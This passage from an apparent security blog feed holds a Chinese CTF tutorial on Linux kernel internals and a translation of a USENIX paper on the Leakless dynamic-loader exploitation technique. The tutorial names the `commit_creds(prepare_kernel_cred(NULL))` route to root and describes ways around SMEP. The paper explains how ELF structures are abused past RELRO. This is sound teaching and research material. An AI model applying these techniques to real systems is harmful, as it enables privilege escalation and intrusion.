class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="comment">/* RCU deletion */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> non_rcu;<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>我们主要关注<code>cred</code>结构体中管理权限的变量</p><h4 id="用户ID-amp-组ID"><a href="#用户ID-amp-组ID" class="headerlink" title="用户ID &amp; 组ID"></a>用户ID &amp; 组ID</h4><p>一个cred结构体中记载了<strong>一个进程四种不同的用户ID</strong>：</p><ul><li><strong>真实用户ID</strong>（real UID）：标识一个<strong>进程启动时的用户ID</strong></li><li><strong>保存用户ID</strong>（saved UID）：标识一个<strong>进程最初的有效用户ID</strong></li><li><strong>有效用户ID</strong>（effective UID）：标识一个进程<strong>正在运行时所属的用户ID</strong>，一个进程在运行途中是可以改变自己所属用户的，因而权限机制也是通过有效用户ID进行认证的</li><li><strong>文件系统用户ID</strong>（UID for VFS ops）：标识一个进程<strong>创建文件时进行标识的用户ID</strong></li></ul><p>在通常情况下这几个ID应当都是相同的</p><p>用户组ID同样分为四个：<code>真实组ID</code>、<code>保存组ID</code>、<code>有效组ID</code>、<code>文件系统组ID</code>，与用户ID是类似的，这里便不再赘叙</p><h3 id="进程权限改变"><a href="#进程权限改变" class="headerlink" title="进程权限改变"></a>进程权限改变</h3><p>前面我们讲到，一个进程的权限是由位于内核空间的<code>cred</code>结构体进行管理的，那么我们不难想到：只要改变一个进程的<code>cred</code>结构体，就能改变其执行权限</p><p>在内核空间有如下两个函数，都位于kernel/cred.c中：</p><ul><li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是<code>daemon</code>参数应为<strong>有效的进程描述符地址或NULL</strong></li><li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程</li></ul><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>查看<code>prepare_kernel_cred()</code>函数源码，观察到如下逻辑：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *daemon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (daemon)</span><br><span class="line">old = get_task_cred(daemon);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">old = get_cred(&amp;init_cred);</span><br><span class="line"></span><br><span class="line">validate_creds(old);</span><br><span class="line"></span><br><span class="line">*<span class="keyword">new</span> = *old;</span><br><span class="line"><span class="keyword">new</span>-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br></pre></td></tr></table></figure><p>在<code>prepare_krenel_cred()</code>函数中，若传入的参数为NULL，则会缺省使用<code>init</code>进程的<code>cred</code>作为模板进行拷贝，<strong>即可以直接获得一个标识着root权限的cred结构体</strong></p><p>那么我们不难想到，只要我们能够在内核空间执行<code>commit_creds(prepare_kernel_cred(NULL))</code>，那么就能够将进程的权限提升到<code>root</code></p><h2 id="五、I-O"><a href="#五、I-O" class="headerlink" title="五、I/O"></a>五、I/O</h2><p>Linux追求高层次抽象上的统一，其设计哲学之一便是<code>万物皆文件</code></p><h3 id="“万物皆文件”"><a href="#“万物皆文件”" class="headerlink" title="“万物皆文件”"></a>“万物皆文件”</h3><p>Linux设计的哲学之一——<code>万物皆文件</code>，在Linux系统的视角下，无论是文件、设备、管道还是目录、进程，甚至是磁盘，套接字等等，一切都可以被抽象为文件，<strong>一切都可以使用访问文件的方式进行操作</strong></p><p>通过这样一种哲学，Linux予开发者以高层次抽象的统一性，提供了<code>操作的一致性</code>：</p><ul><li><strong>所有的读取操作都可以通过read进行</strong></li><li><strong>所有的更改操作都可以通过write进行</strong></li></ul><p>对于开发者而言，将一切的操作都统一于一个高层次抽象的应用接口，无疑是十分美妙的一件事情——<strong>我们不需要去理解实现的细节，只需要对”文件”完成简单的读写操作</strong></p><blockquote><p>例如，在较老版本的Linux中，可以使用cat /dev/urandom &gt; /dev/dsp命令令扬声器产生随机噪声</p></blockquote><h3 id="进程文件系统"><a href="#进程文件系统" class="headerlink" title="进程文件系统"></a>进程文件系统</h3><p>进程文件系统（process file system，简写为procfs）用以描述一个进程，其中包括该进程所打开的文件描述符、堆栈内存布局、环境变量等等</p><p>进程文件系统本身是一个伪文件系统，通常被挂载到<code>/proc</code>目录下，并不真正占用存储系统，而是占用一定的内存</p><p>当一个进程被建立起来时，其进程文件系统便会被挂载到<code>/proc/[PID]</code>下，我们可以在该目录下查看其相关信息</p><h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><p>进程通过<strong>文件描述符（file descriptor）</strong>来完成对文件的访问，其在形式上是一个非负整数，本质上是对文件的索引值，进程所有执行 I/O 操作的系统调用都会通过文件描述符</p><p>每个进程都<strong>独立有着一个文件描述符表</strong>，存放着该进程所打开的文件索引，每当进程<strong>成功</strong>打开一个现有文件/创建一个新文件时（通过系统调用open进行操作），<strong>内核会向进程返回一个文件描述符</strong></p><p>在kernel中有着一个文件表，由所有的进程共享</p><h4 id="stdin、stdout、stderr"><a href="#stdin、stdout、stderr" class="headerlink" title="stdin、stdout、stderr"></a>stdin、stdout、stderr</h4><p>每个Linux进程都应当有着三个标准的POSIX文件描述符，对应着三个标准文件流：</p><ul><li><code>stdin：标准输入 - 0</code></li><li><code>stdout：标准输出 - 1</code></li><li><code>stderr：标准错误 - 2</code></li></ul><p>此后打开的文件描述符应当从<code>3</code>开始</p><h3 id="系统调用：ioctl"><a href="#系统调用：ioctl" class="headerlink" title="系统调用：ioctl"></a>系统调用：ioctl</h3><p>在Linux中一切都可以被视为文件，因而一切都可以以访问文件的方式进行操作，为了方便，Linux定义了系统调用<code>ioctl</code>供进程于设备之间进行通信</p><p>系统调用<code>ioctl</code>是一个专门于设备输入输出操作的一个系统调用，其调用方式如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">unsigned</span> <span class="keyword">long</span> request, ...)</span></span></span><br></pre></td></tr></table></figure><ul><li><strong>fd：设备的文件描述符</strong></li><li><strong>request：请求码</strong></li><li><strong>其他参数</strong></li></ul><p>对于一个提供了ioctl通信方式的设备而言，我们可以通过其文件描述符、使用不同的请起码及其他请求参数通过ioctl系统调用完成不同的对设备的I/O操作</p><blockquote><p>例如CD-ROM驱动程序弹出光驱的这一操作就对应着对”光驱设备”这一文件通过ioctl传递特定的请求码与请求参数完成</p></blockquote><h2 id="六、Loadable-Kernel-Modules（LKMs）"><a href="#六、Loadable-Kernel-Modules（LKMs）" class="headerlink" title="六、Loadable Kernel Modules（LKMs）"></a>六、Loadable Kernel Modules（LKMs）</h2><p>前面我们讲到，Linux Kernle采用的是宏内核架构，一切的系统服务都需要由内核来提供，虽然效率较高，但是缺乏可扩展性与可维护性，同时内核需要装载很多可能用到的服务，但这些服务最终可能未必会用到，还会占据大量内存空间，同时新服务的提供往往意味着要重新编译整个内核</p><p>综合以上考虑，<strong>可装载内核模块（Loadable Kernel Modules</strong>，简称<strong>LKMs）</strong>出现了，位于内核空间的LKMs可以提供<strong>新的系统调用</strong>或其他服务，同时LKMs可以像积木一样被装载内核/从内核中卸载，大大提高了kernel的可拓展性与可维护性</p><blockquote><p>常见的外设驱动便是LKM的一种</p></blockquote><p>LKMs与用户态可执行文件一样都采用ELF格式，但是<strong>LKMs运行在内核空间，且无法脱离内核运行</strong></p><p>通常与LKM相关的命令有以下三个：</p><ul><li><code>lsmod</code>：列出现有的LKMs</li><li><code>insmod</code>：装载新的LKM（需要root）</li><li><code>rmmod</code>：从内核中移除LKM（需要root）</li></ul><blockquote><p>CTF比赛中的kernel pwn的漏洞往往出现在第三方LKM中，<del>一般来说不会真的让你去直接日内核组件</del></p></blockquote><h2 id="七、保护机制"><a href="#七、保护机制" class="headerlink" title="七、保护机制"></a>七、保护机制</h2><p>与一般的程序相同，Linux Kernel同样有着各种各样的保护机制：</p><h3 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h3><p>KASLR即<code>内核空间地址随机化</code>（kernel address space layout randomize），与用户态程序的ASLR相类似——在内核镜像映射到实际的地址空间上加上一个偏移值，但是内核内部的相对偏移其实还是不变的</p><p>在未开启KASLR保护机制时，内核的基址为<code>0xffffffff80000000</code>，内核会占用<code>0xffffffff80000000~0xffffffffC0000000</code>这1G虚拟地址空间</p><h3 id="STACK-PROTECTOR"><a href="#STACK-PROTECTOR" class="headerlink" title="STACK PROTECTOR"></a>STACK PROTECTOR</h3><p>类似于用户态程序的canary，通常又被称作是stack cookie，用以检测<strong>是否发生内核堆栈溢出</strong>，若是发生内核堆栈溢出则会产生kernel panic</p><p>内核中的canary的值通常取自gs段寄存器某个固定偏移处的值</p><h3 id="SMAP-SMEP"><a href="#SMAP-SMEP" class="headerlink" title="SMAP/SMEP"></a>SMAP/SMEP</h3><p>SMAP即<code>管理模式访问保护</code>（Supervisor Mode Access Prevention），SMEP即<code>管理模式执行保护</code>（Supervisor Mode Execution Prevention），这两种保护通常是同时开启的，用以阻止<strong>内核空间直接访问/执行用户空间的数据</strong>，完全地将内核空间与用户空间相分隔开，用以防范ret2usr（return-to-user，将内核空间的指令指针重定向至用户空间上构造好的提权代码）攻击</p><p>SMEP保护的绕过有以下两种方式：</p><ul><li>在设计中，为了使隔离的数据进行交换时具有更高的性能，隐形地址共享始终在（VDSO &amp; VSYSCALL），<strong>用户态进程与内核共享同一块物理内存</strong>，因此通过隐形内存共享可以完整的绕过软件和硬件隔离保护，这种攻击方式被称之为<code>ret2dir</code>（return-to-direct-mappedmomory）</li><li>Intel下系统根据CR4控制寄存器的第20位标识是否开启SMEP保护（1为开启，0为关闭），若是能够通过kernel ROP改变CR4寄存器的值便能够关闭SMEP保护，完成SMEP-bypass，接下来就能够重新进行ret2usr</li></ul><h3 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a>KPTI</h3><p>KPTI即<code>内核页表隔离</code>（Kernel page-table isolation），内核空间与用户空间分别使用两组不同的页表集，这对于内核的内存管理产生了根本性的变化</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-Linux-Kernel-Basic-Knowledge&quot;&gt;&lt;a href=&quot;#0x00-Linux-Kernel-Basic-Knowledge&quot; class=&quot;headerlink&quot; title=&quot;0x00.Linux Kernel Basic Kn
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://billyotry.github.io/categories/CTF/"/>
    
    
      <category term="CTF/Pwn" scheme="https://billyotry.github.io/tags/CTF-Pwn/"/>
    
  </entry>
  
  <entry>
    <title>【转载】ELF如何摧毁圣诞</title>
    <link href="https://billyotry.github.io/2021/03/17/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91ELF%E5%A6%82%E4%BD%95%E6%91%A7%E6%AF%81%E5%9C%A3%E8%AF%9E/"/>
    <id>https://billyotry.github.io/2021/03/17/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91ELF%E5%A6%82%E4%BD%95%E6%91%A7%E6%AF%81%E5%9C%A3%E8%AF%9E/</id>
    <published>2021-03-17T04:08:21.808Z</published>
    <updated>2021-03-30T02:49:48.553Z</updated>
    
    <content type="html"><![CDATA[<p>作者：Alessandro Di Federico, Amat Cama, Yan Shoshitaishvili, Christopher Kruegel and Giovanni Vigna(UCSB,CA, USA; Politecnico di Milano, Milan, Italy)</p><p>原文出自：USENIX Security 2015</p><p>翻译：裴中煜，清华大学网络研究院（本文是清华大学本科毕设要求翻译的外文文献）全部译文</p><p>==================================================================================</p><p><strong>摘要</strong></p><p>近几十年来，计算机软件经历着一场利用技术、发现与保护技术之间的军备竞赛。一些有效的保护措施（例如，ASLR地址空间布局随机化），显著地增加了成功利用一个漏洞的难度。一个现代的漏洞利用一般分为两个阶段：第一步需要进行信息泄露以取得程序的内存分布，接着第二步则进行实际的利用。然而，由于内存破坏后的具体情况各不相同，从程序中得到的内存布局的方法并不总是可行。</p><p>在这篇文章中，我们展示了一种不需要进行信息泄露，而是使用动态装载器来直接标识关键(critical)函数的位置并调用它们的技术。我们在ELF文件标准和动态装载器的实现中找到了几个弱点，这些弱点能够用来解析、执行任意库函数。因此，我们能够绕过特定的安全缓解措施，包括专门为保护ELF数据结构不被攻击者破坏而设计的partial RELRO与full RELRO。我们实现了一个名为Leakless的原型工具，并针对动态装载器的实现、之前的攻击技术和真实案例进行评估以确定我们的发现的影响。另外，Leakless也可以进行更可靠、更不具侵略性的攻击，以减少被入侵检测系统发现的几率。</p><p>==================================================================================</p><p><strong>1. 简介</strong></p><p>从1998年Morris worm发表的第一个被广泛应用的栈溢出文章[27]以来，内存破坏漏洞的保护、利用和减缓技术研究占据着安全研究人员和网络犯罪相同的时间。尽管近年来内存破坏漏洞的盛行趋势有所减缓，经典的栈溢出仍然雄踞最常见软件漏洞的第3位，而另外4种内存破坏漏洞已经跌出了前25名。</p><p>而能够刹住内存破坏之风的原因，是在内存保护与缓解措施方面的巨大投入。这些缓解措施主要应用于2个方面：系统级加固(例如CGroups [23]，Apparmor [4]，Capsicum [41]，和 GRSecurity [18])和应用级加固(如 stack canaries [3]，Address Space Layout Randomization (ASLR)，和 No-eXecute (NX) bit [8])。</p><p>尤其是地址空间布局随机化(ASLR)，通过将动态库加载到内存中随机的一块区域（对于攻击者来说未知），使得攻击者需要将利用过程分为2个阶段。在第一个阶段，攻击者必须使用一个信息泄露漏洞将程序以及动态库的内存布局泄露出来，这样就可以标识出安全关键(securtiy-critical)函数（例如system()库函数）代码的地址。在第二个阶段，攻击者使用一个控制流重定向漏洞，将程序的控制流重定向到这个函数。</p><p>然而，由于内存破坏后的具体情况各不相同，从程序中得到内存布局信息的方法并不总是可行。例如，大多数解析代码（例如解码图像或者视频）经常不会被与攻击者有直接的交互，这就排除了信息泄露的可能性。没有这些信息，再对ASLR保护下的二进制文件使用现在的技术进行利用通常是不可行或不可靠的。</p><p>就像 [36] 中写的那样，除了加固应用和系统的竞赛，对于二进制的格式以及系统组件的一些鲜为人知的角落，则缺少仔细的检查。特别地，我们着眼于操作系统中的一个用户态组件–动态装载器，负责装载二进制文件以及它们依赖的库文件到内存中。二进制文件使用动态装载器来支持导入符号的解析功能。有趣的是，这恰好就是一个面对加固应用的攻击者通过泄露库地址与内容尝试”重塑”一个符号的表现。</p><p>我们的技术的亮点，在于可以通过活用一个动态装载器的功能，完全省去对信息泄露漏洞的需要。我们的技术利用动态装载器与ELF格式的弱点，解析并执行任意库函数，允许我们在没有信息泄露的情况下成功地攻击加固后的应用。任何库函数都可以被执行，只要它所在库被加载进程序。既然所有的二进制程序都依赖于C语言库，这就表示我们的技术能执行system()和execve()这类安全关键(security-critical)函数，从而允许执行任意命令。我们还会展示一些通过重用特定应用程序库中的函数来进行复杂又隐秘的攻击。这项技术非常可靠且架构无关，攻击者不需要知道版本、布局、内容或者其他关于库函数不可知的信息。</p><p>我们实现了自己的想法，写成了一个成为Leakless的原型工具。要使用Leakless，攻击者必须拥有目标应用的副本，且能够利用漏洞（即劫持控制流）。之后，Leakless可以在没有信息泄露的情况下自动地创建利用过程，并且调用攻击者感兴趣的关键库函数。</p><p>为了评估我们技术的影响，我们对几个不同的Linux(以及FreeBSD)发行版进行了调研，发现其中大部分的二进制程序容易被Leakless的攻击所影响（如果目标程序又内存破坏漏洞的话）。我们还审查了多种C语言库的动态装载器实现，发现其中大多数也是容易被Leakless的技术影响的。除此之外，我们展示了一种流行的缓解技术，RELocation Read-Only (RELRO) 重定位只读，它能够保护库函数的调用不受攻击者重定向的影响。然而它也被Leakless完全的绕过了。最后，我们比较了Leakless与类似的ROP编译器产生的ROP链的长度。Leakless产生的ROP链的长度显著地短于现有技术产生的ROP链。就像我们展示的那样，与传统ROP编译器相比Leakless能够实现更加广泛的利用。</p><p>总的来说，我们做出了如下贡献：</p><p>-我们开发了一个新的、架构与平台无关的攻击，使用基于ELF、支持动态装载的系统的固有功能，使得攻击者能够在不做信息泄露的情况下，执行任意库函数。</p><p>-我们详述了实现自己的系统的过程中，面对不同动态装载器实现和多种缓解措施(包括RELRO)的挑战，并最终克服了它们。</p><p>-最后，我们进行了一次深入的评估，包括以前复杂的利用因使用了我们的技术变得容易的案例分析，对几种不同动态装载器实现安全性的评定，我们的技术在不同操作系统配置下适用性的调研，以及Leakless在ROP链长度改善方面的测量。</p><p>==================================================================================</p><p><strong>2. 相关工作：内存破坏的军备竞赛</strong></p><p>内存破坏的军备竞赛(即防御者针对现有的利用技术开发对抗措施，接着攻击者想出新的利用技术来绕过这些措施的过程)已经持续了几十年。这场竞赛的历史已经被记录在别处 [37]，这一节着眼于那些使得现代利用技术被拆分成2个阶段的事件，就是说，需要攻击者在执行任意代码前进行信息泄露这一步。</p><p>早期的栈溢出利用依赖于向缓冲区注入二进制代码(称为shellcode)的能力，并需要覆盖在栈上的一个返回地址使其指向这个缓冲区。随后，当程序从当前函数返回时，执行流就会被重定向到攻击者的shellcode，接着攻击者就能取得程序的控制权。</p><p>结果，安全研究者提出了另一项减缓技术：不可执行位(the NX bit)。不可执行位具有防止那些不该有代码的区域(栈就是典型的这类区域)被执行的效果。</p><p>不可执行位逼迫攻击者们开始采用”代码重用”的理念：使用程序中已经存在的代码(例如系统调用或安全关键(security-critical)库函数)来达到它们的目的。在return-to-libc的利用中 [30,39]，一个攻击者将控制流重定向到一个敏感的libc函数(例如system())，并给予其恰当的参数来实行恶意的行为，而不是注入shellcode。</p><p>为了对抗这项技术，一项系统级的加固措施，称为地址空间布局随机化ASLR被开发出来。一旦ASLR起作用，攻击者将无法知道库的位置。实际上，程序的内存布局(库被加载的位置，栈的位置以及堆的地址)每次执行都是随机的。因此，攻击者不知道将控制流重定向到哪里才能执行特定函数。更糟糕的是，即使是攻击者能够确定这些信息，他仍然不知道特定函数在库中的位置，除非他取得库文件的一份副本。结果，攻击者常常需要泄露库本身的内容并解析代码来确定关键函数的位置。为了泄露库，攻击者需要重用一些程序代码中的小块代码(称为gadgets)来泄露内存位置。这些gadget可以通过将其地址写在栈上并连续地执行返回(ret)指令被组合使用。所以，这项技术被称作”面向返回编程”(Return Oriented Programming (ROP))。</p><p>ROP是攻击者的一个强有力的工具。实际上，在许多二进制程序中发现的ROP Gadgets是”图灵完全”集合，借助ROP编译器能够完成利用的任务。然而，由于其普适性的需要，ROP编译器倾向于生成依赖于具体漏洞细节的长ROP链，它们”太长而无用” [22]。在这之后，我们将展示Leakless生成的相对短的ROP链，并且依赖于存在的缓解措施，只需要很少的gadgets。此外，Leakless在没有图灵完全的Gadgets的集合的情况下也能发挥作用。</p><p>在真实世界的利用中，攻击者往往使用一个信息泄露攻击来泄露库的地址或内容，然后使用这些信息来计算安全关键(security-critical)函数(例如system())的地址，最后发送第二段攻击载荷(payload)到漏洞应用来重定向控制流到想要的函数。</p><p>实际上，我们观察到寻找特定库函数的目标已经被动态装载器实现了，这是一个能够进行符号解析(即确定库函数地址)的操作系统组件。所以，我们意识到可以使用动态装载器来略过信息泄露这一步并巧妙地进行利用。因为我们的攻击不需要信息泄露的步骤，所以我们称它为Leakless。</p><p>使用动态链接器的观念已经在一些return-to-libc的攻击中作为利用过程的一部分被简要地探究过 [15,21,30]。然而，现有的技术非常依赖现有状况，依赖平台，需要两个阶段，或者易受到现有的缓解技术(例如RELRO)的影响，这一影响我们将在后面讨论。而Leakless，作为只有一个阶段，平台无关，具有普适性的技术，在折一的缓解技术面前仍然能够发挥作用。</p><p>在下一节中，我们将阐述动态装载器是如何工作的，然后将会展示如何活用它的功能来进行我们的攻击。</p><p>==================================================================================</p><p><strong>3. 动态装载器</strong></p><p>动态装载器是一个用户执行环境的组件，它能够帮助在开始时加载应用需要的库并解析库导出的动态符号(函数和全局变量)供应用程序使用。在这一节中，我们将会阐述动态符号解析的过程在基于ELF的系统上是如何工作的 [33]。</p><p>ELF是Unix类平台(包括GNU/Linux与FreeBSD)上一种普遍的一种标准格式，其定义独立于任何一种特定动态装载器实现。因为Leakless主要依赖于ELF标准的特性，它也很容易应用于很多系统。</p><p><strong>3.1 ELF对象</strong></p><p>一个应用由一个主要ELF二进制文件(可执行文件)和数个动态库构成，它们都是ELF格式。每个ELF对象由多个segments组成，每个segment则含有一个或多个sections(译注：以下称sections为段)。</p><p>每个段都有约定的含义。举个例子，.text段包含着程序的代码，.data段包含着它可写的数据(例如全局变量)，而.rodata段则包含着只读的数据(例如常量和字符串)。段的列表以数组的形式存在于ELF文件的Elf_Shdr结构体中。</p><p>注意这里有两种ELF结构体的版本：一种是32位的(例如Elf32_Rel)，一种是64位的(例如Elf64_Rel)。为了简化起见，除了在相关讨论的特定案例中，一般情况我们将忽略这些细节。</p><p><strong>3.2 动态符号与重定位</strong></p><p>在这一节中，我们将对ELF符号解析过程相关的数据结构进行一个总结。图一总体展示了这些数据结构以及它们之间的关系。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13299369785/0" alt="image-20210317205600388"></p><p>figure 1：在符号解析过程中相关数据结构的关系(除去符号版本)。阴影背景部分表示只读内存。</p><p>一个ELF对象可以向其他ELF对象导出符号或导入符号。一个符号表示一个具有名称表示的函数或者全局变量。</p><p>每个符号都使用ELF_Sym结构体来描述。这个结构体的实例是ELF中.dynsym段的组成部分，它包含以下的相关的域：</p><p>[st_name] 相对.dynstr段开始的偏移值，那里有这个符号名字的字符串。</p><p>[st_value] 如果这个符号被导出，则存有这个导出函数的虚拟地址，否则为NULL。</p><p>这些结构被用来解析导入的符号。导入符号的解析需要重定位的支持，重定位项以Elf_Rel结构体来描述。这个结构的实例存在于.rel.plt段(用于导入函数)和.rel.dyn段中(用于导入全局变量)。在这里我们感兴趣的是前者。Elf_Rel结构体有以下域：</p><p>[r_info] 此域的高位3个字节作为一个无符号的下标，表示这个符号在.dynsym段中的位置。</p><p>[r_offset] 解析后的符号地址被写入内存中的位置(绝对地址)。</p><p>当程序导入一个正常函数时，链接器会在.dynstr段中包含一个函数名称的字符串，在.dynsym段中包含一个指向它的符号(Elf_Sym)，在.rel.plt段中包含一个指向这个符号的重定位项(Elf_Rel)。</p><p>重定位的目标(即Elf_Rel结构中的r_offset域)将会是全局偏移量表(Global Offset Table，GOT)中的一个条目。GOT表保存于.got.plt段，由能够解析.rel.plt段中的重定位的动态链接器来填写。</p><p><strong>3.3 惰性符号解析</strong></p><p>因为在程序开始时就解析所有导入符号并应用重定位是一项开销较大的操作，符号的解析将是惰性的。在惰性符号解析中，每个函数地址(相当于GOT中的条目)只在需要的时候才进行解析(即这个函数第一次被调用的时候)。</p><p>当一个程序需要调用导入函数时，他将会调用链接表(Procedure Linkage Table，.plt段)中的一段特定代码。就像列表1展示的那样，每个导入函数在PLT中有一段特定代码，其执行无条件跳转到相关的GOT条目。</p><p>在符号解析结束后，GOT条目已经包含了实际函数的地址，所以执行能够无缝地进入导入的库中。当函数返回时，控制流返回到PLT中特定代码的调用者位置，故剩下的PLT代码不会被执行。不过，当程序刚启动时，GOT条目被初始化为一个指向相关PLT代码第2条指令的地址。这部分代码将会导入函数的标识(以一个Elf_Rel实例在.rel.plt段中偏移的形式)压栈，然后跳到.plt段开头PLT0的代码处。这回，PLT0的代码，将GOT[1]的值压栈并间接跳转至GOT[2]。这两个GOT表的条目有着特殊的含义，动态装载器在开始时给他们填充了特殊的内容：</p><p>-GOT[1].一个指向内部数据结构的指针，类型是link_map，在动态装载器内部使用，包含了进行符号解析需要的当前ELF对象的信息。</p><p>-GOT[2].一个指向动态装载器中_dl_runtime_resolve函数的指针。</p><p>总的来说，PLT条目只是进行了以下函数调用：</p><p>_dl_runtime_resolve(link_map_obj，reloc_index)</p><p>这个函数使用link_map_obj参数来取得解析导入函数(使用reloc_index参数标识)需要的信息，并将结果写到正确的GOT条目中。在_dl_runtime_resolve解析完成导入符号中，控制流就交到了那个函数手中，使得解析过程对调用者来说完全透明。下次PLT代码调用时则会直接进入目标函数执行。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13299415823/0" alt="image-20210317210423265"></p><p>Listing 1：PLT与GOT的例子</p><p>link_map结构体包含了动态装载器加载ELF对象需要的全部信息。每个link_map实例都是一条双向链表的一个节点，而这个链表保存了所有加载的ELF对象的信息。</p><p><strong>3.4 符号版本</strong></p><p>ELF标准提供了一个可以导入一个特定版本符号的机能。这个特性被用于从一个特定的库中导入函数。例如，使用版本标识GLIBC_2.2.5，就可以从2.2.5版本的GNU C标准库中导入fopen这个C标准库函数。.gnu.version_r段保存了版本的定义，形式是Elf_Verdef结构体。</p><p>一个动态符号与指向它的Elf_Verdef的关联保存在.gnu.version段中，其中有一个Elf_Verneed结构体组成的数组，每个元素对应动态符号表中的一项。这个结构体只有一个域：一个16位的整数，表示.gnu.version_r段中的下标。</p><p>得益于这样的布局，动态链接器使用Elf_Rel结构体成员r_info中的下标同时作为.dynsym段和.gnu.version段的下标。理解这一过程非常重要，因为Leakless之后将被它所扰。</p><p><strong>3.5 .dynamic段和RELRO</strong></p><p>动态装载器从.dynamic段收集所有它需要的关于ELF对象的信息。.dynamic段由Elf_Dyn结构组成，一个Elf_Dyn是一个键值对，其中存储了不同类型的信息。相关的条目已经在表1中展示，它们保存着特定段的绝对地址。有一个例外是DT_DEBUG条目，它保存的动态装载器内部数据结构的指针。这个条目是为了调试的需要由动态装载器初始化的。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13299489556/0" alt="image-20210317211920785"></p><p>Table 1：.dynamic段的条目，d_tag是键，d_value是值。</p><p>一个攻击者如果能干扰这些值，那将会造成安全威胁。为此，一种称作RELRO(重定位只读 RELocation Read Only)保护机制被引入了动态装载器。RELRO有两种形式：部分和完全。</p><p>[部分RELRO] 在这种模式下，一些段(包括.dynamic)在初始化后将会被标识为只读。</p><p>[完全RELRO] 除了部分RELRO，惰性解析会被禁用：所有的导入符号将在开始时被解析，.got.plt段会被完全初始化为目标函数的最终地址，并被标记为只读。此外，既然惰性解析被禁用，GOT[1]与GOT[2]条目将不会被初始化为之前在3.3节中提到的值。</p><p>可以看到，RELRO显著地增加了复杂性，Leakless为了能在这些对抗措施下工作，必须解决这个问题(它也做到了)。</p><p>值得注意的是之前提到的link_map结构出于内部用途考虑，在I_info域中保存了.dynamic段中大多数条目的指针构成的一个数组。既然动态装载器完全地信任这个域的内容，那么Leakless将有能力巧用这个结构达成自己的目的。</p><p>==================================================================================</p><p><strong>4. 